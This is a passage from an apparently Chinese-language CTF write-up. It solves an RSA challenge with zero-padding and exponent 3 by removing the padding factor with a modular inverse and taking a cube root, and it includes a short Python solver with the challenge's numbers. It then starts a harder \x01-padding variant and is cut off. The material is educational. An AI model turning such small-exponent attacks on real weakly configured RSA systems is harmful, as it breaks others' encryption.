encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.69444em;vertical-align:0"></span><span class="mord mathnormal" style="margin-right:.03148em">k</span></span></span></span> 需要很大，不能通过枚举破解。</p><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">m</span>):
    <span class="hljs-keyword">return</span> m + <span class="hljs-string">b'\x00'</span> * (<span class="hljs-number">255</span> - <span class="hljs-built_in">len</span>(m))</code></pre><p>那么就尝试把 padding 的过程写成数学表达式吧。我们记原本的消息（也就是 flag）为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>m</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">m_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.58056em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span></span></span></span>，经过 padding 之后的消息为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.43056em;vertical-align:0"></span><span class="mord mathnormal">m</span></span></span></span>，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>m</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">m_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.58056em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span></span></span></span> 长度未知，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.43056em;vertical-align:0"></span><span class="mord mathnormal">m</span></span></span></span> 长度为255。尽管我们不知道原本消息的长度，但我们可以大胆假设一下消息的长度不会超过45，于是干脆假设 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>m</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">m_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.58056em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span></span></span></span> 长度为45，那么 padding 的过程也就相当于在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>m</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">m_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.58056em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span></span></span></span> 后面补了210个全0的字节（8*210个0比特）。将 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.43056em;vertical-align:0"></span><span class="mord mathnormal">m</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>m</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">m_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.58056em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span></span></span></span> 看成十进制整数，于是得到这样的关系式：</p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>m</mi><mo>=</mo><mi>p</mi><mi>a</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>m</mi><mn>0</mn></msub><mo stretchy="false">)</mo><mo>=</mo><msub><mi>m</mi><mn>0</mn></msub><mo>×</mo><mo stretchy="false">(</mo><msup><mn>2</mn><mn>8</mn></msup><msup><mo stretchy="false">)</mo><mn>210</mn></msup></mrow><annotation encoding="application/x-tex">m=pad(m_0)=m_0\times (2^8)^{210}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.43056em;vertical-align:0"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.73333em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">×</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span></span></span></p><p>于是根据 RSA 的加密关系，有：</p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>c</mi><mo>≡</mo><msup><mi>m</mi><mn>3</mn></msup><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>N</mi></mrow><annotation encoding="application/x-tex">c\equiv m^3 \bmod N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.46375em;vertical-align:0"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.8641079999999999em;vertical-align:0"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.05555555555555555em"></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:.05555555555555555em"></span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.68333em;vertical-align:0"></span><span class="mord mathnormal" style="margin-right:.10903em">N</span></span></span></span></span></p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>c</mi><mo>≡</mo><mo stretchy="false">(</mo><msub><mi>m</mi><mn>0</mn></msub><mo>×</mo><mo stretchy="false">(</mo><msup><mn>2</mn><mn>8</mn></msup><msup><mo stretchy="false">)</mo><mn>210</mn></msup><msup><mo stretchy="false">)</mo><mn>3</mn></msup><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>N</mi></mrow><annotation encoding="application/x-tex">c\equiv (m_0\times (2^8)^{210})^3 \bmod N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.46375em;vertical-align:0"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">×</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.05555555555555555em"></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:.05555555555555555em"></span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.68333em;vertical-align:0"></span><span class="mord mathnormal" style="margin-right:.10903em">N</span></span></span></span></span></p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>c</mi><mo>≡</mo><msubsup><mi>m</mi><mn>0</mn><mn>3</mn></msubsup><mo>×</mo><mo stretchy="false">(</mo><msup><mn>2</mn><mn>8</mn></msup><msup><mo stretchy="false">)</mo><mn>210</mn></msup><mo>×</mo><mo stretchy="false">(</mo><msup><mn>2</mn><mn>8</mn></msup><msup><mo stretchy="false">)</mo><mn>210</mn></msup><mo>×</mo><mo stretchy="false">(</mo><msup><mn>2</mn><mn>8</mn></msup><msup><mo stretchy="false">)</mo><mn>210</mn></msup><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>N</mi></mrow><annotation encoding="application/x-tex">c\equiv m_0^3\times (2^8)^{210}\times (2^8)^{210}\times (2^8)^{210} \bmod N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.46375em;vertical-align:0"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:1.1111079999999998em;vertical-align:-.247em"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-2.4530000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.247em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">×</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">×</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">×</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.05555555555555555em"></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:.05555555555555555em"></span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.68333em;vertical-align:0"></span><span class="mord mathnormal" style="margin-right:.10903em">N</span></span></span></span></span></p><p>其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.43056em;vertical-align:0"></span><span class="mord mathnormal">c</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.68333em;vertical-align:0"></span><span class="mord mathnormal" style="margin-right:.10903em">N</span></span></span></span> 我们都已知，那么等式两边同时乘以 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msup><mn>2</mn><mn>8</mn></msup><msup><mo stretchy="false">)</mo><mn>210</mn></msup></mrow><annotation encoding="application/x-tex">(2^8)^{210}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8141079999999999em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8141079999999999em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span></span> 的逆元的三次方，我们就可以得到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>m</mi><mn>0</mn><mn>3</mn></msubsup><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>N</mi></mrow><annotation encoding="application/x-tex">m_0^3 \bmod N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0622159999999998em;vertical-align:-.24810799999999997em"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.8141079999999999em"><span style="top:-2.4518920000000004em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.24810799999999997em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.05555555555555555em"></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:.05555555555555555em"></span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.68333em;vertical-align:0"></span><span class="mord mathnormal" style="margin-right:.10903em">N</span></span></span></span>，此时的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>m</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">m_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.58056em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span></span></span></span> 因为长度只有45，再应用小公钥指数攻击即可（事实上都不需要加上 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.69444em;vertical-align:0"></span><span class="mord mathnormal" style="margin-right:.03148em">k</span></span></span></span>，直接开三次方就开出整数了）。</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> iroot

n = <span class="hljs-number">16530365897488441262718469160468305284672770158565384656092954623166151666302358404933519039638206427781958395014977873069315249917687177391054598956921816589982653878314268070746187225652226338489804977785763153836685700798637491040895954952095422949071944941698464075339538328682378899518357259255186771307748930179001187349761726049249957165990922342916419869650553300100675697071325624717861450136979864203856665171732760034460573404619831815041691417998362001038634540263831565785650815875836418726271391989975051958347165191015489214380435520924596097210274112756495171085840647510675017795358896351877011292749</span>
ct = <span class="hljs-number">1649242716162425826952050775303626268696750298411662319537259424228876945404220528279665292763881515080700349538084002211268837126748044168226799293579149622927076423346431814176280309043104500742869900600491670771220025075170550107937095925147470540522377810395335659166311121764537896320094910974901416858921029589127145477064557304982115657845643933262558300020611395670651783198790515650255634160032636409647553580657649111930945938237122361584298948645275748211120347592403311681019560483613600396814929463355821651618347651685517027239330376660444812896525930403439089808046524555500501484453485168927363278214</span>

r = <span class="hljs-built_in">pow</span>(<span class="hljs-number">256</span>, <span class="hljs-number">210</span>, n)
inv_r = inverse(r, n)
m = iroot(ct*inv_r*inv_r*inv_r % n, <span class="hljs-number">3</span>)
<span class="hljs-built_in">print</span>(long_to_bytes(m[<span class="hljs-number">0</span>]))</code></pre><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_3e5fbce8c1975f88b7c9e4025dd94203.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_3e5fbce8c1975f88b7c9e4025dd94203.png?width=1920" srcset="/loading.gif" alt=""></p><h3 id="child-rsa"><a class="markdownIt-Anchor" href="#child-rsa"></a> Child RSA</h3><p>上一题的进阶版本，仅仅把 padding 的模式从全零填充换成了填充 <code>\x01</code>（即 <code>00000001</code>），提升了难度。</p><p>依旧可以用数学语言写出 padding 过程的表达式。我们同样记原本的消息（也就是 flag）为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>m</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">m_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.58056em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span></span></span></span>，经过 padding 之后的消息为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.43056em;vertical-align:0"></span><span class="mord mathnormal">m</span></span></span></span>，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>m</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">m_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.58056em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span></span></span></span> 长度未知，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.43056em;vertical-align:0"></span><span class="mord mathnormal">m</span></span></span></span> 长度为255。同样大胆假设 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>m</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">m_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.58056em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span></span></span></span> 长度为45，那么 padding 的过程也就相当于在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>m</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">m_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.58056em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 